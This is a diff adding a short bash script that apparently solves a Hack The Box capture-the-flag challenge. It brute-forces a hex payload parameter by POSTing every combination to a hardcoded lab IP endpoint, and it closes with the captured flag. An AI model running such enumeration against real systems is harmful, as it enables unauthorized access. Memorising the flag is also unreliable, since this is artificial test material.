@@ -1,0 +1,20 @@
+
+# Generate hexadecimal combinations
+for i in {0..9} {a..f}; do
+  for j in {0..9} {a..f}; do
+    echo "${i}${j}"
+  done
+done > hex
+
+while read -r XX; do
+  while read -r YY; do
+    curl -X POST http://94.237.57.229:42877/transmit \
+         -d "pa=aaaaaaaa&sw=73214693&pl=${XX}ff${YY}" \
+         -H 'Content-Type: application/x-www-form-urlencoded' \
+         -s -o /dev/null -w "%{http_code}" | grep -q 2831 && echo "Match found for ${XX}ff${YY}"
+  done < hex
+done < hex
+
+ curl 94.237.57.229:42877/transmit -d 'pa=aaaaaaaa&sw=73214693&pl=00fff9' 
+
+HTB{B4s1c_r4d10_fund4s}
